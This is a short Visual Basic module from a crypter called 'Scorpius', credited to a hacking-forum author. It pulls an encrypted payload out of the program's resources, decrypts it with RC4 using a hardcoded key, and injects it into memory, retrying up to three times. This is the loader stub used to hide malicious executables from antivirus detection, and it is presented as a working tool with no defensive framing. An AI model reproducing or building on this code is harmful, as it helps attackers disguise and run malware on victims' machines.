Attribute VB_Name = "mStart"
'---------------------------------------------------------------------------------------
' Application  : Scorpius
' Author       : carb0n
' DateTime     : 08/1/2010  21:10
' Purpose      : Encrypt file and load it into memory.
' Link         : http://hackhound.org
' Greetings    : steve10120, shapeless, cool_mofo_2, marjinZ, Rtflol, ap0calypse
'---------------------------------------------------------------------------------------

Option Explicit

Public Sub Main()
Dim mFile() As Byte
mFile = GetResDataBytes(1, 5000) 'Get the file that was added to this resource.
RC4ED mFile, "576890-jHGFRGHJ(*&^%RGHJBVCxvb" 'Decrypt the resource.

Dim iFile As Long
For iFile = 1 To 3 ' Try to inject 3 times if first time fails.
If RunExe(AppExe, mFile) <> 0 Then Exit For
Next

End Sub


